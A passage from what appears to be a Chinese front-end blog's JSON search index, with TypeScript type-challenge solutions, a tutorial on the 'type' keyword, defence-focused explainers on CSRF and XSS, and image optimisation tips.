class=\"attr\">description</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"attr\">todo</span>: <span class=\"title class_\">MyReadonly</span>&lt;<span class=\"title class_\">Todo</span>&gt; = {</span><br><span class=\"line\">  <span class=\"attr\">title</span>: <span class=\"string\">\"Hey\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">description</span>: <span class=\"string\">\"foobar\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">todo.<span class=\"property\">title</span> = <span class=\"string\">\"Hello\"</span> <span class=\"comment\">// Error: cannot reassign a readonly property</span></span><br><span class=\"line\">todo.<span class=\"property\">description</span> = <span class=\"string\">\"barFoo\"</span> <span class=\"comment\">// Error: cannot reassign a readonly property</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"解析\"><a href=\"#解析\" class=\"headerlink\" title=\"解析\"></a>解析</h3><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">MyReadonly</span>&lt;T&gt; = {</span><br><span class=\"line\"><span class=\"keyword\">readonly</span> [P <span class=\"keyword\">in</span> keyof T]: T[P];</span><br><span class=\"line\">};</span><br></pre></td></tr></tbody></table></figure>\n","categories":["前端","TypeScript","type"],"tags":["前端","TypeScript","type"]},{"title":"对象部分属性只读 Readonly","url":"//typescript/questions/Readonly2.html","content":"<p>实现一个泛型 <code>MyReadonly2&lt;T, K&gt;</code>，它带有两种类型的参数 <code>T</code> 和 <code>K</code>。</p>\n<p>类型 <code>K</code> 指定 <code>T</code> 中要被设置为只读 (readonly) 的属性。如果未提供 <code>K</code>，则应使所有属性都变为只读，就像普通的 <code>Readonly&lt;T&gt;</code> 一样。</p>\n<p>例如</p>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Todo</span> {</span><br><span class=\"line\"><span class=\"attr\">title</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\"><span class=\"attr\">description</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\"><span class=\"attr\">completed</span>: <span class=\"built_in\">boolean</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"attr\">todo</span>: <span class=\"title class_\">MyReadonly2</span>&lt;<span class=\"title class_\">Todo</span>, <span class=\"string\">'title'</span> | <span class=\"string\">'description'</span>&gt; = {</span><br><span class=\"line\"><span class=\"attr\">title</span>: <span class=\"string\">\"Hey\"</span>,</span><br><span class=\"line\"><span class=\"attr\">description</span>: <span class=\"string\">\"foobar\"</span>,</span><br><span class=\"line\"><span class=\"attr\">completed</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">todo.<span class=\"property\">title</span> = <span class=\"string\">\"Hello\"</span> <span class=\"comment\">// Error: cannot reassign a readonly property</span></span><br><span class=\"line\">todo.<span class=\"property\">description</span> = <span class=\"string\">\"barFoo\"</span> <span class=\"comment\">// Error: cannot reassign a readonly property</span></span><br><span class=\"line\">todo.<span class=\"property\">completed</span> = <span class=\"literal\">true</span> <span class=\"comment\">// OK</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"解析\"><a href=\"#解析\" class=\"headerlink\" title=\"解析\"></a>解析</h3><p>先取出需要 <code>readonly</code> 参数，然后在把不需要声明的参数用排除法加上。 </p>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">MyReadonly2</span>&lt;T, D <span class=\"keyword\">extends</span> keyof T&gt; = {</span><br><span class=\"line\">    <span class=\"keyword\">readonly</span> [P <span class=\"keyword\">in</span> D]: T[P];</span><br><span class=\"line\">} &amp; {</span><br><span class=\"line\">    [P <span class=\"keyword\">in</span> keyof T <span class=\"keyword\">as</span> P <span class=\"keyword\">extends</span> D ? <span class=\"built_in\">never</span> : P]: T[P];</span><br><span class=\"line\">};</span><br></pre></td></tr></tbody></table></figure>\n","categories":["前端","TypeScript","type"],"tags":["前端","TypeScript","type"]},{"title":"实现 ReturnType","url":"//typescript/questions/returntype.html","content":"<p>不使用 <code>ReturnType</code> 实现 TypeScript 的 <code>ReturnType&lt;T&gt;</code> 泛型。</p>\n<p>例如：</p>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">fn</span> = (<span class=\"params\">v: <span class=\"built_in\">boolean</span></span>) =&gt; {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">2</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> a = <span class=\"title class_\">MyReturnType</span>&lt;<span class=\"keyword\">typeof</span> fn&gt; <span class=\"comment\">// 应推导出 \"1 | 2\"</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"解答\"><a href=\"#解答\" class=\"headerlink\" title=\"解答\"></a>解答</h3><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">MyReturnType</span>&lt;T <span class=\"keyword\">extends</span> <span class=\"title class_\">Function</span>&gt; = T <span class=\"keyword\">extends</span> (...<span class=\"attr\">args</span>: <span class=\"built_in\">any</span>[]) =&gt; infer R</span><br><span class=\"line\">? R</span><br><span class=\"line\">: <span class=\"built_in\">never</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">fn</span> = (<span class=\"params\">v: <span class=\"built_in\">boolean</span></span>) =&gt; (v ? <span class=\"number\">1</span> : <span class=\"number\">2</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">fn1</span> = (<span class=\"params\">v: <span class=\"built_in\">boolean</span>, w: <span class=\"built_in\">any</span></span>) =&gt; (v ? <span class=\"number\">1</span> : <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> fnType = <span class=\"title class_\">MyReturnType</span>&lt;<span class=\"keyword\">typeof</span> fn&gt;;</span><br><span class=\"line\"><span class=\"keyword\">type</span> fnType1 = <span class=\"title class_\">MyReturnType</span>&lt;<span class=\"keyword\">typeof</span> fn1&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">ComplexObject</span> = {</span><br><span class=\"line\">    <span class=\"attr\">a</span>: [<span class=\"number\">12</span>, <span class=\"string\">\"foo\"</span>];</span><br><span class=\"line\">    <span class=\"attr\">bar</span>: <span class=\"string\">\"hello\"</span>;</span><br><span class=\"line\">    <span class=\"title function_\">prev</span>(): <span class=\"built_in\">number</span>;</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> fnType2 = <span class=\"title class_\">MyReturnType</span>&lt;<span class=\"function\">() =&gt;</span> <span class=\"title class_\">ComplexObject</span>&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n","categories":["前端","TypeScript","type"],"tags":["前端","TypeScript","type"]},{"title":"实现类似 Vue 的类型支持的简化版本","url":"//typescript/questions/SimpleVue.html","content":"<p>实现类似 Vue 的类型支持的简化版本。</p>\n<p>通过提供一个函数 <code>SimpleVue</code>（类似于 <code>Vue.extend</code> 或 <code>defineComponent</code>），它应该正确地推断出 computed 和 methods 内部的 <code>this</code> 类型。</p>\n<p>在此挑战中，我们假设 <code>SimpleVue</code> 接受只带有 <code>data</code>，<code>computed</code> 和 <code>methods</code> 字段的 Object 作为其唯一的参数，</p>\n<ul>\n<li><p><code>data</code> 是一个简单的函数，它返回一个提供上下文 <code>this</code> 的对象，但是你无法在 <code>data</code> 中获取其他的计算属性或方法。</p>\n</li>\n<li><p><code>computed</code> 是将 <code>this</code> 作为上下文的函数的对象，进行一些计算并返回结果。在上下文中应暴露计算出的值而不是函数。</p>\n</li>\n<li><p><code>methods</code> 是函数的对象，其上下文也为 <code>this</code>。函数中可以访问 <code>data</code>，<code>computed</code> 以及其他 <code>methods</code> 中的暴露的字段。 <code>computed</code> 与 <code>methods</code> 的不同之处在于 <code>methods</code> 在上下文中按原样暴露为函数。</p>\n</li>\n</ul>\n<p><code>SimpleVue</code> 的返回值类型可以是任意的。</p>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> instance = <span class=\"title class_\">SimpleVue</span>({</span><br><span class=\"line\">  <span class=\"title function_\">data</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> {</span><br><span class=\"line\">      <span class=\"attr\">firstname</span>: <span class=\"string\">'Type'</span>,</span><br><span class=\"line\">      <span class=\"attr\">lastname</span>: <span class=\"string\">'Challenges'</span>,</span><br><span class=\"line\">      <span class=\"attr\">amount</span>: <span class=\"number\">10</span>,</span><br><span class=\"line\">    }</span><br><span class=\"line\">  },</span><br><span class=\"line\">  <span class=\"attr\">computed</span>: {</span><br><span class=\"line\">    <span class=\"title function_\">fullname</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"property\">firstname</span> + <span class=\"string\">' '</span> + <span class=\"variable language_\">this</span>.<span class=\"property\">lastname</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">  },</span><br><span class=\"line\">  <span class=\"attr\">methods</span>: {</span><br><span class=\"line\">    <span class=\"title function_\">hi</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">      <span class=\"title function_\">alert</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">fullname</span>.<span class=\"title function_\">toLowerCase</span>())</span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\">})</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"解答\"><a href=\"#解答\" class=\"headerlink\" title=\"解答\"></a>解答</h3><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">DataType</span>&lt;T&gt; = T <span class=\"keyword\">extends</span> { <span class=\"title function_\">data</span>(): infer D } ? D : <span class=\"built_in\">never</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">ComputedType</span>&lt;T, D&gt; = T <span class=\"keyword\">extends</span> { <span class=\"attr\">computed</span>: infer C }</span><br><span class=\"line\">? {</span><br><span class=\"line\">    [K <span class=\"keyword\">in</span> keyof C]: C[K] <span class=\"keyword\">extends</span> (<span class=\"attr\">this</span>: D) =&gt; infer R ? R : <span class=\"built_in\">never</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">: {};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">MethodsType</span>&lt;T, D, C&gt; = T <span class=\"keyword\">extends</span> { <span class=\"attr\">methods</span>: infer M }</span><br><span class=\"line\">? {</span><br><span class=\"line\">    [K <span class=\"keyword\">in</span> keyof M]: M[K] <span class=\"keyword\">extends</span> (<span class=\"attr\">this</span>: D &amp; C) =&gt; infer R ? R : <span class=\"built_in\">never</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">: {};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"keyword\">function</span> <span class=\"title class_\">SimpleVue</span>&lt;T&gt;(<span class=\"attr\">options</span>: T): {</span><br><span class=\"line\"><span class=\"attr\">data</span>: <span class=\"title class_\">DataType</span>&lt;T&gt;;</span><br><span class=\"line\"><span class=\"attr\">computed</span>: <span class=\"title class_\">ComputedType</span>&lt;T, <span class=\"title class_\">DataType</span>&lt;T&gt;&gt;;</span><br><span class=\"line\"><span class=\"attr\">methods</span>: <span class=\"title class_\">MethodsType</span>&lt;T, <span class=\"title class_\">DataType</span>&lt;T&gt;, <span class=\"title class_\">ComputedType</span>&lt;T, <span class=\"title class_\">DataType</span>&lt;T&gt;&gt;&gt;;</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n","categories":["前端","TypeScript","type"],"tags":["前端","TypeScript","type"]},{"title":"type 的使用","url":"//typescript/use/type.html","content":"<h4 id=\"type-的使用\"><a href=\"#type-的使用\" class=\"headerlink\" title=\"type 的使用\"></a>type 的使用</h4><p>作用：给已有类型取别名 和 定义一个新的类型 (搭配联合类型使用)</p>\n<h5 id=\"1-类型别名\"><a href=\"#1-类型别名\" class=\"headerlink\" title=\"1. 类型别名\"></a>1. 类型别名</h5><p><strong>语法 :</strong> <code>type 别名 = 类型</code></p>\n<p><strong>实例 :</strong></p>\n<figure class=\"highlight typescript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">St</span> = <span class=\"built_in\">string</span> <span class=\"comment\">// 定义</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">str1</span>:<span class=\"title class_\">St</span> = <span class=\"string\">'abc'</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">str2</span>:<span class=\"built_in\">string</span> = <span class=\"string\">'abc'</span></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h5 id=\"2-自定义类型\"><a href=\"#2-自定义类型\" class=\"headerlink\" title=\"2.自定义类型\"></a>2. 自定义类型</h5><p><strong>语法 :</strong> <code>type 别名 = 类型 | 类型1 | 类型2</code></p>\n<p><strong>实例 :</strong></p>\n<figure class=\"highlight typescript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">NewType</span> = <span class=\"built_in\">string</span> | <span class=\"built_in\">number</span> <span class=\"comment\">// 定义类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">a</span>: <span class=\"title class_\">NewType</span> = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"attr\">b</span>: <span class=\"title class_\">NewType</span> = <span class=\"string\">'1'</span></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h5 id=\"3-泛型定义\"><a href=\"#3-泛型定义\" class=\"headerlink\" title=\"3.泛型定义\"></a>3. 泛型定义</h5><p><strong>语法</strong>： <code>type 别名&lt;T&gt; = 类型&lt;T&gt; | 类型1&lt;T&gt; | 类型2&lt;T&gt;</code></p>\n<p><strong>实例</strong> :</p>\n<figure class=\"highlight typescript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">NewType</span>&lt;T&gt; = {</span><br><span class=\"line\">   <span class=\"attr\">name</span>: T</span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"keyword\">let</span> a : <span class=\"title class_\">NewType</span>&lt;<span class=\"built_in\">number</span>&gt; = { <span class=\"attr\">name</span>: <span class=\"number\">0</span> }</span><br><span class=\"line\"> <span class=\"keyword\">let</span> b : <span class=\"title class_\">NewType</span>&lt;<span class=\"built_in\">string</span>&gt; = { <span class=\"attr\">name</span>: <span class=\"string\">'0'</span> }</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h5 id=\"4-联合类型-相当于继承类型\"><a href=\"#4-联合类型-相当于继承类型\" class=\"headerlink\" title=\"4.联合类型(相当于继承类型)\"></a>4. 联合类型 (相当于继承类型)</h5><p><strong>语法</strong>：<code>type 别名 = 类型 &amp; 类型1 &amp; 类型2</code></p>\n<p><strong>示例</strong>：</p>\n<figure class=\"highlight typescript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">User</span> = {</span><br><span class=\"line\">    <span class=\"attr\">name</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    age?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">Job</span> = {</span><br><span class=\"line\">    <span class=\"attr\">jobs</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">UserInfo</span> = <span class=\"title class_\">User</span> &amp; <span class=\"title class_\">Job</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>","categories":["前端","TypeScript"],"tags":["前端","TypeScript"]},{"title":"什么是 CSRF 攻击？","url":"//web/cross/site/request/forgeries.html","content":"<h5 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h5><p>CSRF（Cross-Site Request Forgeries） 攻击指的是跨站请求伪造攻击，攻击者诱导用户进入一个第三方网站，然后该网站向被攻击网站发送跨站请求。如果用户在被攻击网站中保存了登录状态，那么攻击者就可以利用这个登录状态，绕过后台的用户验证，冒充用户向服务器执行一些操作。</p>\n<p>CSRF 攻击的本质是利用 cookie 会在同源请求中携带发送给服务器的特点，以此来实现用户的冒充。</p>\n<h5 id=\"攻击类型\"><a href=\"#攻击类型\" class=\"headerlink\" title=\"攻击类型\"></a>攻击类型</h5><p>常见的 CSRF 攻击有三种：</p>\n<ul>\n<li>GET 类型的 CSRF 攻击，比如在网站中的一个 img 标签里构建一个请求，当用户打开这个网站的时候就会自动发起提交；</li>\n<li>POST 类型的 CSRF 攻击，比如构建一个表单，然后隐藏它，当用户进入页面时，自动提交这个表单。</li>\n<li>链接类型的 CSRF 攻击，比如在 a 标签的 href 属性里构建一个请求，然后诱导用户去点击。</li>\n</ul>\n<h5 id=\"如何防御-CSRF-攻击？\"><a href=\"#如何防御-CSRF-攻击？\" class=\"headerlink\" title=\"如何防御 CSRF 攻击？\"></a>如何防御 CSRF 攻击？</h5><p>CSRF 攻击可以使用以下方法来防护：</p>\n<p>进行同源检测，服务器根据 http 请求头中 origin 或者 referer 信息来判断请求是否为允许访问的站点，从而对请求进行过滤。当 origin 或者 referer 信息都不存在的时候，直接阻止请求。这种方式的缺点是有些情况下 referer 可以被伪造，同时还会把搜索引擎的链接也给屏蔽了。所以一般网站会允许搜索引擎的页面请求，但是相应的页面请求这种请求方式也可能被攻击者给利用。（Referer 字段会告诉服务器该网页是从哪个页面链接过来的）</p>\n<p>使用 CSRF Token 进行验证，服务器向用户返回一个随机数 Token，当网站再次发起请求时，在请求参数中加入服务器端返回的 token，然后服务器对这个 token 进行验证。这种方法解决了使用 cookie 单一验证方式时，可能会被冒用的问题，但是这种方法存在一个缺点就是，我们需要给网站中的所有请求都添加上这个 token，操作比较繁琐。</p>\n<p>还有一个问题是一般不会只有一台网站服务器，如果请求经过负载平衡转移到了其他的服务器，但是这个服务器的 session 中没有保留这个 token 的话，就没有办法验证了。这种情况可以通过改变 token 的构建方式来解决。</p>\n<p>对 Cookie 进行双重验证，服务器在用户访问网站页面时，向请求域名注入一个 Cookie，内容为随机字符串，然后当用户再次向服务器发送请求的时候，从 cookie 中取出这个字符串，添加到 URL 参数中，然后服务器通过对 cookie 中的数据和参数中的数据进行比较，来进行验证。使用这种方式是利用了攻击者只能利用 cookie，但是不能访问获取 cookie 的特点。并且这种方法比 CSRF Token 的方法更加方便，并且不涉及到分布式访问的问题。这种方法的缺点是如果网站存在 XSS 漏洞的，那么这种方式会失效。同时这种方式不能做到子域名的隔离。</p>\n<p>在设置 cookie 属性的时候设置 Samesite ，限制 cookie 不能作为被第三方使用，从而可以避免被攻击者利用。Samesite 一共有两种模式，一种是严格模式，在严格模式下 cookie 在任何情况下都不可能作为第三方 Cookie 使用，在宽松模式下，cookie 可以被请求是 GET 请求，且会发生页面跳转的请求所使用。</p>\n","categories":["浏览器","网络安全"],"tags":["前端","浏览器","网络安全","CSRF"]},{"title":"什么是 XSS 攻击？","url":"//web/cross/site/script.html","content":"<h5 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h5><p>XSS 攻击指的是跨站脚本攻击，是一种代码注入攻击。攻击者通过在网站注入恶意脚本，使之在用户的浏览器上运行，从而盗取用户的信息如 cookie 等。</p>\n<p>XSS 的本质是因为网站没有对恶意代码进行过滤，与正常的代码混合在一起了，浏览器没有办法分辨哪些脚本是可信的，从而导致了恶意代码的执行。</p>\n<p>攻击者可以通过这种攻击方式可以进行以下操作：</p>\n<ol>\n<li>获取页面的数据，如 DOM、cookie、localStorage；</li>\n<li>DOS 攻击，发送合理请求，占用服务器资源，从而使用户无法访问服务器；</li>\n<li>破坏页面结构；</li>\n<li>流量劫持（将链接指向某网站）</li>\n</ol>\n<h5 id=\"攻击类型\"><a href=\"#攻击类型\" class=\"headerlink\" title=\"攻击类型\"></a>攻击类型</h5><p>XSS 可以分为存储型、反射型和 DOM 型：</p>\n<ul>\n<li>存储型指的是恶意脚本会存储在目标服务器上，当浏览器请求数据时，脚本从服务器传回并执行。</li>\n<li>反射型指的是攻击者诱导用户访问一个带有恶意代码的 URL 后，服务器端接收数据后处理，然后把带有恶意代码的数据发送到浏览器端，浏览器端解析这段带有 XSS 代码的数据后当做脚本执行，最终完成 XSS 攻击。</li>\n<li>DOM 型指的通过修改页面的 DOM 节点形成的 XSS。</li>\n</ul>\n<h6 id=\"存储型-XSS-的攻击步骤：\"><a href=\"#存储型-XSS-的攻击步骤：\" class=\"headerlink\" title=\"存储型 XSS 的攻击步骤：\"></a>存储型 XSS 的攻击步骤：</h6><ol>\n<li>攻击者将恶意代码提交到⽬标⽹站的数据库中。</li>\n<li>⽤户打开⽬标⽹站时，⽹站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li>\n<li>⽤户浏览器接收到响应后解析执⾏，混在其中的恶意代码也被执⾏。</li>\n<li>恶意代码窃取⽤户数据并发送到攻击者的⽹站，或者冒充⽤户的⾏为，调⽤⽬标⽹站接⼝执⾏攻击者指定的操作。<br>这种攻击常⻅于带有⽤户保存数据的⽹站功能，如论坛发帖、商品评论、⽤户私信等。</li>\n</ol>\n<h6 id=\"反射型-XSS-的攻击步骤：\"><a href=\"#反射型-XSS-的攻击步骤：\" class=\"headerlink\" title=\"反射型 XSS 的攻击步骤：\"></a>反射型 XSS 的攻击步骤：</h6><ol>\n<li><p>攻击者构造出特殊的 URL，其中包含恶意代码。</p>\n</li>\n<li><p>⽤户打开带有恶意代码的 URL 时，⽹站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</p>\n</li>\n<li><p>⽤户浏览器接收到响应后解析执⾏，混在其中的恶意代码也被执⾏。</p>\n</li>\n<li><p>恶意代码窃取⽤户数据并发送到攻击者的⽹站，或者冒充⽤户的⾏为，调⽤⽬标⽹站接⼝执⾏攻击者指定的操作。</p>\n<p>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库⾥，反射型 XSS 的恶意代码存在 URL ⾥。</p>\n<p>反射型 XSS 漏洞常⻅于通过 URL 传递参数的功能，如⽹站搜索、跳转等。 由于需要⽤户主动打开恶意的 URL 才能⽣效，攻击者往往会结合多种⼿段诱导⽤户点击。</p>\n</li>\n</ol>\n<h6 id=\"DOM-型-XSS-的攻击步骤：\"><a href=\"#DOM-型-XSS-的攻击步骤：\" class=\"headerlink\" title=\"DOM 型 XSS 的攻击步骤：\"></a>DOM 型 XSS 的攻击步骤：</h6><ol>\n<li><p>攻击者构造出特殊的 URL，其中包含恶意代码。</p>\n</li>\n<li><p>⽤户打开带有恶意代码的 URL。</p>\n</li>\n<li><p>⽤户浏览器接收到响应后解析执⾏，前端 JavaScript 取出 URL 中的恶意代码并执⾏。</p>\n</li>\n<li><p>恶意代码窃取⽤户数据并发送到攻击者的⽹站，或者冒充⽤户的⾏为，调⽤⽬标⽹站接⼝执⾏攻击者指定的操作。</p>\n<p><strong>DOM 型 XSS 跟前两种 XSS 的区别</strong>：DOM 型 XSS 攻击中，取出和执⾏恶意代码由浏览器端完成，属于前端 JavaScript ⾃身的安全漏洞，⽽其他两种 XSS 都属于服务端的安全漏洞。</p>\n</li>\n</ol>\n<h5 id=\"如何防御-XSS-攻击？\"><a href=\"#如何防御-XSS-攻击？\" class=\"headerlink\" title=\"如何防御 XSS 攻击？\"></a>如何防御 XSS 攻击？</h5><p>可以看到 XSS 危害如此之大，那么在开发网站时就要做好防御措施，具体措施如下：</p>\n<p>可以从浏览器的执行来进行预防，一种是使用纯前端的方式，不用服务器端拼接后返回（不使用服务端渲染）。另一种是对需要插入到 HTML 中的代码做好充分的转义。对于 DOM 型的攻击，主要是前端脚本的不可靠而造成的，对于数据获取渲染和字符串拼接的时候应该对可能出现的恶意代码情况进行判断。</p>\n<p>使用 CSP ，CSP 的本质是建立一个白名单，告诉浏览器哪些外部资源可以加载和执行，从而防止恶意代码的注入攻击。</p>\n<ol>\n<li><p>CSP 指的是内容安全策略，它的本质是建立一个白名单，告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截由浏览器自己来实现。</p>\n</li>\n<li><p>通常有两种方式来开启 CSP，一种是设置 HTTP 首部中的 Content-Security-Policy，一种是设置 meta 标签的方式 &lt;metahttp-equiv=”Content-Security-Policy”&gt;<br>对一些敏感信息进行保护，比如 cookie 使用 http-only，使得脚本无法获取。也可以使用验证码，避免脚本伪装成用户执行一些操作。</p>\n</li>\n</ol>\n","categories":["浏览器","网络安全"],"tags":["前端","浏览器","网络安全","XSS"]},{"title":"有哪些可能引起前端安全的问题？","url":"//web/security/question.html","content":"<h5 id=\"跨站脚本-Cross-Site-Scripting-XSS\"><a href=\"#跨站脚本-Cross-Site-Scripting-XSS\" class=\"headerlink\" title=\"跨站脚本 (Cross-Site Scripting, XSS)\"></a><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NDkwMTkxL2FydGljbGUvZGV0YWlscy8xMzIyMTIyNjY=\">跨站脚本 (Cross-Site Scripting, XSS)<i class=\"fa fa-external-link-alt\"></i></span></h5><p>⼀种代码注⼊⽅式，为了与 CSS 区分所以被称作 XSS。早期常⻅于⽹络论坛，起因是⽹站没有对⽤户的输⼊进⾏严格的限制，使得攻击者可以将脚本上传到帖⼦让其他⼈浏览到有恶意脚本的⻚⾯，其注⼊⽅式很简单包括但不限于 JavaScript / CSS / Flash 等；</p>\n<h5 id=\"iframe-的滥⽤\"><a href=\"#iframe-的滥⽤\" class=\"headerlink\" title=\"iframe 的滥⽤\"></a>iframe 的滥⽤</h5><p>iframe 中的内容是由第三⽅来提供的，默认情况下他们不受控制，他们可以在 iframe 中运⾏ JavaScirpt 脚本、Flash 插件、弹出对话框等等，这可能会破坏前端⽤户体验；</p>\n<h5 id=\"跨站点请求伪造（Cross-Site-Request-Forgeries，CSRF）\"><a href=\"#跨站点请求伪造（Cross-Site-Request-Forgeries，CSRF）\" class=\"headerlink\" title=\"跨站点请求伪造（Cross-Site Request Forgeries，CSRF）\"></a><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NDkwMTkxL2FydGljbGUvZGV0YWlscy8xMzIyMjA1Mzg=\">跨站点请求伪造（Cross-Site Request Forgeries，CSRF）<i class=\"fa fa-external-link-alt\"></i></span></h5><p>指攻击者通过设置好的陷阱，强制对已完成认证的⽤户进⾏⾮预期的个⼈信息或设定信息等某些状态更新，属于被动攻击恶意</p>\n<h5 id=\"第三⽅库\"><a href=\"#第三⽅库\" class=\"headerlink\" title=\"第三⽅库\"></a>第三⽅库</h5><p>⽆论是后端服务器应⽤还是前端应⽤开发，绝⼤多数时候都是在借助开发框架和各种类库进⾏快速开发，⼀旦第三⽅库被植⼊恶意代码很容易引起安全问题。</p>\n","categories":["浏览器","网络安全"],"tags":["前端","浏览器","网络安全"]},{"title":"如何对项目中的图片进行优化？","url":"//web/image/perform.html","content":"<h5 id=\"优化步骤方案\"><a href=\"#优化步骤方案\" class=\"headerlink\" title=\"优化步骤方案\"></a>优化步骤方案</h5><ol>\n<li><p>不用图片。很多时候会使用到很多修饰类图片，其实这类修饰图片<br>完全可以用 CSS 去代替。</p>\n</li>\n<li><p>对于移动端来说，屏幕宽度就那么点，完全没有必要去加载原图浪<br>费带宽。一般图片都用 CDN 加载，可以计算出适配屏幕的宽度，然<br>后去请求相应裁剪好的图片。</p>\n</li>\n<li><p>小图使用 base64 格式</p>\n</li>\n<li><p>将多个图标文件整合到一张图片中（雪碧图）</p>\n</li>\n<li><p>选择正确的图片格式：</p>\n<ul>\n<li><p>对于能够显示 WebP 格式的浏览器尽量使用 WebP 格式。因为 WebP 格式具有更好的图像数据压缩算法，能带来更小的图片体积，而且拥有肉眼识别无差异的图像质量，缺点就是兼容性并不好</p>\n</li>\n<li><p>小图使用 PNG，其实对于大部分图标这类图片，完全可以使用 SVG 代替</p>\n</li>\n<li><p>照片使用 JPEG</p>\n</li>\n</ul>\n</li>\n</ol>\n<h5 id=\"常见的图片格式及使用场景\"><a href=\"#常见的图片格式及使用场景\" class=\"headerlink\" 